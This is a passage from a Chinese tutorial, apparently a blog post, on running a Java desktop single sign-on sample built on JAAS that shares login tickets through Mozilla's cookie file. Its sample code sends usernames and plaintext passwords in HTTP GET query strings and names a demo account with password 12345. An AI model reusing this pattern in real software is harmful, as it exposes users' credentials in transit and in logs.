<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">从网站可以下载一个简单的桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的样例</span><span style="font-size:12pt">(<a target="_blank" href="http://gceclub.sun.com.cn/wangyu/" style="color:rgb(119,0,0); text-decoration:none">http://gceclub.sun.com.cn/wangyu/desktop-sso/desktopsso.zip)</a></span><span style="font-size:12pt">和全部源码（</span><span style="font-size:12pt">http://gceclub.sun.com.cn/wangyu/desktop-sso/desktopsso_src.zip</span><span style="font-size:12pt">），虽然简单，但是它具有桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">大多数的功能，稍微加以扩充就可以成为自己的解决方案。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt 36pt"><strong><span style="font-size:12pt">6.1</span><span style="font-size:12pt">桌面样例的部署</span></strong></div>&#13;
<ol type="1" style="margin:5px 0px 5px 35px; padding:0px; list-style-type:none">&#13;
<li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">运行此桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">需要三个前提条件：</span><span style="font-size:12pt"><br />&#13;
a) WEB-SSO</span><span style="font-size:12pt">的身份认证应用应该正在运行，因为我们在桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">当中需要用到统一的认证服务</span><span style="font-size:12pt"><br />&#13;
b) </span><span style="font-size:12pt">当前桌面需要运行</span><span style="font-size:12pt">Mozilla</span><span style="font-size:12pt">或</span><span style="font-size:12pt">Netscape</span><span style="font-size:12pt">浏览器，因为我们将</span><span style="font-size:12pt">ticket</span><span style="font-size:12pt">保存到</span><span style="font-size:12pt">mozilla</span><span style="font-size:12pt">的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">文件中</span><span style="font-size:12pt"><br />&#13;
c) </span><span style="font-size:12pt">必须在</span><span style="font-size:12pt">JDK1.4</span><span style="font-size:12pt">以上运行。（</span><span style="font-size:12pt">WEB-SSO</span><span style="font-size:12pt">需要</span><span style="font-size:12pt">JDK1.5</span><span style="font-size:12pt">以上）</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">解开</span><span style="font-size:12pt">desktopsso.zip</span><span style="font-size:12pt">文件，里面有两个目录</span><span style="font-size:12pt">bin</span><span style="font-size:12pt">和</span><span style="font-size:12pt">lib</span><span style="font-size:12pt">。</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">bin</span><span style="font-size:12pt">目录下有一些脚本文件和配置文件，其中</span><span style="font-size:12pt">config.properties</span><span style="font-size:12pt">包含了三个需要配置的参数：</span><span style="font-size:12pt"><br />&#13;
a) SSOServiceURL</span><span style="font-size:12pt">要指向</span><span style="font-size:12pt">WebSSO</span><span style="font-size:12pt">部署的身份认证的</span><span style="font-size:12pt">URL<br />&#13;
b) SSOLoginPage</span><span style="font-size:12pt">要指向</span><span style="font-size:12pt">WebSSO</span><span style="font-size:12pt">部署的身份认证的登录页面</span><span style="font-size:12pt">URL<br />&#13;
c) cookiefilepath</span><span style="font-size:12pt">要指向当前用户的</span><span style="font-size:12pt">mozilla</span><span style="font-size:12pt">所存放</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">的文件</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">在</span><span style="font-size:12pt">bin</span><span style="font-size:12pt">目录下还有一个</span><span style="font-size:12pt">login.conf</span><span style="font-size:12pt">是用来配置</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">登录模块，本样例提供了两个，读者可以任意选择其中一个（也可以都选），再重新运行程序，查看登录认证的变化</span></li><li style="margin:0px; padding:2px 0px; text-align:left; list-style-type:decimal">&#13;
<span style="font-size:12pt">在</span><span style="font-size:12pt">bin</span><span style="font-size:12pt">下的运行脚本可能需要作相应的修改</span><span style="font-size:12pt"><br />&#13;
a) </span><span style="font-size:12pt">如果是在</span><span style="font-size:12pt">unix</span><span style="font-size:12pt">下，各个</span><span style="font-size:12pt">jar</span><span style="font-size:12pt">文件需要用“</span><span style="font-size:12pt">:</span><span style="font-size:12pt">”</span><span style="font-size:12pt">来隔开，而不是“</span><span style="font-size:12pt">;</span><span style="font-size:12pt">”</span><span style="font-size:12pt"><br />&#13;
b) java </span><span style="font-size:12pt">运行程序需要放置在当前运行的路径下，否则需要加上</span><span style="font-size:12pt">java</span><span style="font-size:12pt">的路径全名。</span></li></ol>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt 36pt"><strong><span style="font-size:12pt">6.2</span><span style="font-size:12pt">桌面样例的运行</span></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">样例程序包含三个简单的</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">控制台程序，这三个程序单独运行都需要登录。如果运行第一个命叫“</span><span style="font-size:12pt">GameSystem</span><span style="font-size:12pt">”</span><span style="font-size:12pt">的程序，提示需要输入用户名和密码：</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt"><img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image020.gif" style="border:0px" /></span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">效验成功以后，便会显示当前登录的用户的基本信息等等。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt"><img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image022.gif" style="border:0px" /></span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> <span style="font-size:12pt">这时候再运行第二个桌面</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">应用（</span><span style="font-size:12pt">mailSystem</span><span style="font-size:12pt">）的时候，就不需要再登录了，直接就显示出来刚才登录的用户。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"><span style="font-size:12pt"><img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image024.gif" style="border:0px" /></span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">第三个应用是</span><span style="font-size:12pt">logout</span><span style="font-size:12pt">，运行它之后，用户便退出系统。再访问的时候，又需要重新登录了。请读者再制裁执行完</span><span style="font-size:12pt">logout</span><span style="font-size:12pt">之后，重新验证一下前两个应用的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">：先运行第二个应用，再运行第一个，会看到相同的效果。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">我们的样例并没有在这里停步，事实上，本样例不仅能够和在几个</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">应用之间</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">，还能和浏览器进行</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">，也就是将浏览器也当成是桌面的一部分。这对一些行业有着不小的吸引力。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">这时候再打开</span><span style="font-size:12pt">Mozilla</span><span style="font-size:12pt">浏览器，访问以前提到的那两个</span><span style="font-size:12pt">WEB</span><span style="font-size:12pt">应用，会发现只要桌面应用如果登录过，</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用就不用再登录了，而且能显示刚才登录的用户的信息。读者可以在几个桌面和</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用之间进行登录和</span><span style="font-size:12pt">logout</span><span style="font-size:12pt">的试验，看看它们之间的</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt"><img alt="" src="http://p.blog.csdn.net/images/p_blog_csdn_net/javachannel/image026.gif" style="border:0px" /></span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt 36pt"><strong><span style="font-size:12pt">6.3</span><span style="font-size:12pt">桌面样例的源码分析</span></strong></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt 36pt"><span style="font-size:12pt">桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">的样例使用了</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">（要了解</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">的详细的信息请参考</span><span style="font-size:12pt">http://java.sun.com/products/jaas</span><span style="font-size:12pt">）。</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">是对</span><span style="font-size:12pt">PAM</span><span style="font-size:12pt">（</span><span style="font-size:12pt">Pluggable&#13;
 Authentication Module</span><span style="font-size:12pt">）的</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">实现，来完成 </span><span style="font-size:12pt">Java</span><span style="font-size:12pt">应用可插拔的安全认证模块。使用</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">作为</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">应用的安全认证模块有很多好处，最主要的是不需要修改源代码就可以更换认证方式。例如原有的</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">应用如果使用</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">的认证，如果需要应用</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">，只需要修改</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">的配置文件就行了。现在在流行的</span><span style="font-size:12pt">J2EE</span><span style="font-size:12pt">和其他 </span><span style="font-size:12pt">Java</span><span style="font-size:12pt">的产品中，用户的身份认证都是通过</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">来完成的。在样例中，我们就展示了这个功能。请看配置文件</span><span style="font-size:12pt">login.conf</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">DesktopSSO {</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span><span style="font-size:12pt">desktopsso.share.PasswordLoginModule required;</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span><span style="font-size:12pt">desktopsso.share.DesktopSSOLoginModule required;</span></div>&#13;
<div align="left"><span style="font-size:12pt">};</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">当我们注解掉第二个模块的时候，只有第一个模块起作用。在这个模块的作用下，只有</span><span style="font-size:12pt">test</span><span style="font-size:12pt">用户（密码是</span><span style="font-size:12pt">12345</span><span style="font-size:12pt">）才能登录。当我们注解掉第一个模块的时候，只有第二个模块起作用，桌面</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">才会起作用。</span></div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left"><span style="font-size:12pt">所有的</span><span style="font-size:12pt">Java</span><span style="font-size:12pt">桌面样例程序都是标准</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">应用，熟悉</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">的程序员会很快了解。</span><span style="font-size:12pt">JAAS</span><span style="font-size:12pt">中主要的是登录模块（</span><span style="font-size:12pt">LoginModule</span><span style="font-size:12pt">）。下面是</span><span style="font-size:12pt">SSO</span><span style="font-size:12pt">登录模块的源码：</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt"> </span><span style="font-size:12pt">public class DesktopSSOLoginModule implements LoginModule {</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span><span style="font-size:12pt">..........</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span><span style="font-size:12pt">private String SSOServiceURL = "";</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span><span style="font-size:12pt">private String SSOLoginPage = "";</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span><span style="font-size:12pt">private static String cookiefilepath = "";  </span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span><span style="font-size:12pt">.........</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">在</span><span style="font-size:12pt">config.properties</span><span style="font-size:12pt">的文件中，我们配置了它们的值：</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:10pt">SSOServiceURL=http://wangyu.prc.sun.com:8080/SSOAuth/SSOAuth</span></div>&#13;
<div align="left"><span style="font-size:10pt">SSOLoginPage=http://wangyu.prc.sun.com:8080/SSOAuth/login.jsp</span></div>&#13;
<div align="left"><span style="font-size:12pt">cookiefilepath=C:\\Documents and Settings\\yw137672\\Application Data\\Mozilla\\Profiles\\default\\hog6z1ji.slt\\cookies.txt</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">SSOServiceURL</span><span style="font-size:12pt">和</span><span style="font-size:12pt">SSOLoginPage</span><span style="font-size:12pt">成员变量指向了在</span><span style="font-size:12pt">Web-SSO</span><span style="font-size:12pt">中用过的身份认证模块：</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">，这就说明在桌面系统中我们试图和</span><span style="font-size:12pt">Web</span><span style="font-size:12pt">应用共用一个认证服务。而</span><span style="font-size:12pt">cookiefilepath</span><span style="font-size:12pt">成员变量则泄露了一个“天机”：我们使用了</span><span style="font-size:12pt">Mozilla</span><span style="font-size:12pt">浏览器的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">文件来保存登录的凭证。换句话说，和</span><span style="font-size:12pt">Mozilla</span><span style="font-size:12pt">共用了一个保存登录凭证的机制。之所以用</span><span style="font-size:12pt">Mozilla</span><span style="font-size:12pt">是应为它的</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">文件格式简单，很容易编程访问和修改任意的</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">值。（我试图解析</span><span style="font-size:12pt">Internet&#13;
 Explorer</span><span style="font-size:12pt">的</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">文件但没有成功。）</span></div>&#13;
<div align="left"><span style="font-size:12pt">下面是登录模块DesktopSSOLoginModule的主体：</span><span style="font-size:12pt">login()</span><span style="font-size:12pt">方法。逻辑也是非常简单：先用</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">来登陆，如果成功，则直接就进入系统，否则需要用户输入用户名和密码来登录系统。</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">public boolean login() throws LoginException{</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">try {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">if (Cookielogin()) return true;</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} catch (IOException ex) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">ex.printStackTrace();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">if (passwordlogin()) return true;</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">throw new FailedLoginException();</span></div>&#13;
<div align="left"><span style="font-size:12pt"> </span><span style="font-size:12pt">}</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left"><span style="font-size:12pt">下面是Cookielogin()</span><span style="font-size:12pt">方法的实体，它的逻辑是：</span><span style="font-size:12pt">先从</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">文件中获得相应的</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">值，通过身份效验服务效验</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">的有效性。如果</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">有效</span><span style="font-size:12pt">就算登录成功；如果不成功或</span><span style="font-size:12pt">Cookie</span><span style="font-size:12pt">不存在，用</span><span style="font-size:12pt">cookie</span><span style="font-size:12pt">登录就算失败。</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">public boolean Cookielogin() throws LoginException,IOException {</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">String cookieValue="";</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">int cookieIndex =foundCookie();</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">if (cookieIndex&lt;0)</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">return false;</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">else</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">cookieValue = getCookieValue(cookieIndex);</span></div>&#13;
<div align="left"><span style="font-size:12pt">     </span><span style="font-size:12pt">username = cookieAuth(cookieValue);</span></div>&#13;
<div align="left"><span style="font-size:12pt">     </span><span style="font-size:12pt">if (! username.equals("failed")) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">         </span><span style="font-size:12pt">loginSuccess = true;</span></div>&#13;
<div align="left"><span style="font-size:12pt">         </span><span style="font-size:12pt">return true;</span></div>&#13;
<div align="left"><span style="font-size:12pt">     </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">     </span><span style="font-size:12pt">return false;</span></div>&#13;
<div align="left"><span style="font-size:12pt"> </span><span style="font-size:12pt">}</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left"><span style="font-size:12pt">用用户名和密码登录的方法要复杂一些，通过</span><span style="font-size:12pt">Callback</span><span style="font-size:12pt">的机制和屏幕输入输出进行信息交互，完成用户登录信息的获取；获取信息以后通过</span><span style="font-size:12pt">userAuth</span><span style="font-size:12pt">方法来调用远端</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">的服务来判定当前登录的有效性。</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt">   </span><span style="font-size:12pt">public boolean passwordlogin() throws LoginException {</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">//</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">// Since we need input from a user, we need a callback handler</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">if (callbackHandler == null) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">       </span><span style="font-size:12pt">throw new LoginException("No CallbackHandler defined");</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">Callback[] callbacks = new Callback[2];</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">callbacks[0] = new NameCallback("Username");</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">callbacks[1] = new PasswordCallback("Password", false);</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">//</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">// Call the callback handler to get the username and password</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">try {</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">callbackHandler.handle(callbacks);</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">username = ((NameCallback)callbacks[0]).getName();</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">char[] temp = ((PasswordCallback)callbacks[1]).getPassword();</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">password = new char[temp.length];</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">System.arraycopy(temp, 0, password, 0, temp.length);</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">((PasswordCallback)callbacks[1]).clearPassword();</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">} catch (IOException ioe) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">throw new LoginException(ioe.toString());</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">} catch (UnsupportedCallbackException uce) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">      </span><span style="font-size:12pt">throw new LoginException(uce.toString());</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">System.out.println();</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">String authresult ="";</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">try {</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">authresult = userAuth(username, password);</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">} catch (IOException ex) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">ex.printStackTrace();</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">if (! authresult.equals("failed")) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">loginSuccess= true;</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">clearPassword();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">try {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">updateCookie(authresult);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} catch (IOException ex) {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">ex.printStackTrace();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">return true;</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">  </span></div>&#13;
<div align="left"><span style="font-size:12pt"> </span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">loginSuccess = false;</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">username = null;</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">clearPassword();</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">System.out.println( "Login: PasswordLoginModule FAIL" );</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">throw new FailedLoginException();</span></div>&#13;
<div align="left"><span style="font-size:12pt"> </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt"> </span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left"><span style="font-size:12pt">CookieAuth</span><span style="font-size:12pt">和</span><span style="font-size:12pt">userAuth</span><span style="font-size:12pt">方法都是利用</span><span style="font-size:12pt">apahce</span><span style="font-size:12pt">的</span><span style="font-size:12pt">httpclient</span><span style="font-size:12pt">工具包和远程的</span><span style="font-size:12pt">SSOAuth</span><span style="font-size:12pt">进行</span><span style="font-size:12pt">http</span><span style="font-size:12pt">连接，获取服务。</span></div>&#13;
<table width="100%" border="1" cellpadding="0" cellspacing="0" style="width:965px">&#13;
<tbody>&#13;
<tr>&#13;
<td width="100%" style="padding:3.75pt; width:953px; background-color:rgb(238,238,238)">&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">private String cookieAuth(String cookievalue) throws IOException{</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String result = "failed";</span></div>&#13;
<div align="left"><span style="font-size:12pt">       </span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">HttpClient httpclient = new HttpClient();      </span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">GetMethod httpget = new GetMethod(SSOServiceURL+Action1+cookievalue);</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">try {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">httpclient.executeMethod(httpget);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">result = httpget.getResponseBodyAsString();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} finally {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">httpget.releaseConnection();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">return result;</span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"> </div>&#13;
<div align="left"><span style="font-size:12pt">private String userAuth(String username, char[] password) throws IOException{</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String result = "failed";</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">String passwd= new String(password);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">HttpClient httpclient = new HttpClient();      </span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">GetMethod httpget = new GetMethod(SSOServiceURL+Action2+username+"&amp;password="+passwd);</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">passwd = null;</span></div>&#13;
<div align="left"><span style="font-size:12pt">   </span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">try {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">httpclient.executeMethod(httpget);</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">result = httpget.getResponseBodyAsString();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">} finally {</span></div>&#13;
<div align="left"><span style="font-size:12pt">            </span><span style="font-size:12pt">httpget.releaseConnection();</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">}</span></div>&#13;
<div align="left"><span style="font-size:12pt">        </span><span style="font-size:12pt">return result;</span></div>&#13;
<div align="left"><span style="font-size:12pt">       </span></div>&#13;
<div align="left"><span style="font-size:12pt">    </span><span style="font-size:12pt">}</span></div>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<div align="left" style="margin:0cm 0cm 12pt"> </div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><span style="font-size:12pt">还有一个地方需要补充说明的是，在本样例中，用户名和密码的输入都会在屏幕上显示明文。如果希望用掩码形式来显示密码，以提高安全性，请参考：</span><span style="font-size:12pt">http://java.sun.com/developer/technicalArticles/Security/pwordmask/</span></div>&#13;
<div align="left" style="margin:0cm 0cm 5.95pt"><strong><em><span style="font-size:14pt">7 </span><span style="font-size:14pt">真正安全的全方位</span><span style="font-size:14pt">SSO</span><span style="font-size:14pt">解决方案：</span><span style="font-size:14pt">Kerberos</span></em></strong></div>&#13;
